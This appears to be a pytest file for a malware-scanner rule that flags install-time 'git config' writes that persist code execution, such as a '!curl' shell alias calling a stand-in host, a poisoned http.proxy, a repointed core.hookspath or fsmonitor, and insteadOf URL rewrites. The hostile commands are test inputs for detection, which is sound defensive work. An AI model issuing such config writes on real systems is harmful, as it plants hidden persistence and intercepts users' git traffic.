"""`EXEC_GIT_CONFIG_PERSIST` — install-time `git config` writes that run code on later git use.

Found by the held-out blind corpus (W14): `git config --global` can register a shell-command
alias, poison `http.proxy`, repoint `core.hookspath`, or rewrite URLs via `insteadOf` — all
dormant at install (they fire on the next git command), so no behavioural rule catches them.

Shipped at HIGH on a measured basis, like `EXEC_SCHEDULED_PERSISTENCE`: across all 742 recorded
installs (142 eval + 100- and 500-package uncurated sweeps) `git config` appears **zero** times,
so this is clean separation, not a guess. It closes bc04 and bc10 at the rules floor; bc03 (a
`.git/hooks/` file write) and bc08 (a DNS threshold) are out of its scope and stay open.
"""

import pytest

from brain.rules import Severity, evaluate
from shared.contract import DetonateResult, ExecEvent
from tests.conftest import NPM_EXEC


def exec_(args: str, binary: str = "/usr/bin/git") -> ExecEvent:
    return ExecEvent(ts="2026-01-01T00:00:01Z", pid=42, ppid=1, binary=binary, args=args,
                     parent_binary="/usr/local/bin/node", uid=10001, cwd="/work")  # fmt: skip


def result(*execs: ExecEvent) -> DetonateResult:
    return DetonateResult(job_id="j", status="completed", exit_code=0, duration_s=1,
                          exec_events=[NPM_EXEC, *execs], connect_events=[], dns_queries=[],
                          stdout_tail="", stderr_tail="")  # fmt: skip


def ids(res: DetonateResult) -> list[str]:
    return [h.rule_id for h in evaluate(res)]


# --- the held-out cases this was written for, exactly as the kernel recorded them ---


def test_bc10_http_proxy_poisoning_is_flagged():
    recorded = "config --global http.proxy http://192.0.2.70:8080"
    hits = [h for h in evaluate(result(exec_(recorded))) if h.rule_id == "EXEC_GIT_CONFIG_PERSIST"]
    assert len(hits) == 1 and hits[0].severity == Severity.HIGH


def test_bc04_shell_alias_is_flagged_even_though_curl_never_execs():
    """The alias value is a `!`-prefixed shell command; curl does not run at install, so
    EXEC_NET_TOOL cannot fire — this rule is what catches it."""
    recorded = (
        "config --global alias.pull-stats '!curl -s -m 3 http://192.0.2.30/s >/dev/null 2>&1'"
    )
    res = result(exec_(recorded))
    assert "EXEC_GIT_CONFIG_PERSIST" in ids(res)
    assert "EXEC_NET_TOOL" not in ids(res), "if this fires, the rule is no longer load-bearing"


@pytest.mark.parametrize(
    "args",
    [
        "config --global http.proxy http://192.0.2.70:8080",
        "config --global https.proxy http://192.0.2.70:8080",
        "config --global core.hookspath /tmp/hooks",
        "config --global core.fsmonitor /tmp/evil",
        "config --global alias.x '!/tmp/x.sh'",
        'config --global url."http://192.0.2.1/".insteadOf https://github.com/',
        "config --system http.proxy http://192.0.2.70:8080",
    ],
)
def test_dangerous_git_config_writes_are_flagged(args):
    assert "EXEC_GIT_CONFIG_PERSIST" in ids(result(exec_(args)))


# --- what it must not flag ---


@pytest.mark.parametrize(
    "args",
    [
        "config --global user.email dev@example.com",  # benign identity
        "config --global user.name Dev",
        "config --get remote.origin.url",  # a read, not a write
        "config --list",
        "config --global alias.co checkout",  # a plain alias, no shell command
        "config --global init.defaultBranch main",
        "config --global pull.rebase true",
    ],
)
def test_benign_git_config_is_not_flagged(args):
    assert "EXEC_GIT_CONFIG_PERSIST" not in ids(result(exec_(args)))


def test_a_git_config_mention_in_a_path_or_doc_is_not_flagged():
    # the words appear, but not as a git config command
    assert "EXEC_GIT_CONFIG_PERSIST" not in ids(result(exec_(
        "install --prefix docs/git-config-http.proxy-examples", "/usr/local/bin/npm")))  # fmt: skip


def test_the_npm_baseline_never_trips_it():
    assert "EXEC_GIT_CONFIG_PERSIST" not in ids(result())


# --- it blocks, and it is reached off the full argv not the clipped evidence ---


def test_the_rule_blocks():
    from brain.llm import LlmOutcome
    from brain.verdict import combine

    res = result(exec_("config --global http.proxy http://192.0.2.70:8080"))
    final = combine(evaluate(res), LlmOutcome("m", error="x", skipped=True), res)
    assert final.title == "Blocked"


def test_a_match_past_the_evidence_cap_is_still_found():
    long = "config " + "--quiet " * 60 + "--global http.proxy http://192.0.2.70:8080"
    assert "EXEC_GIT_CONFIG_PERSIST" in ids(result(exec_(long)))
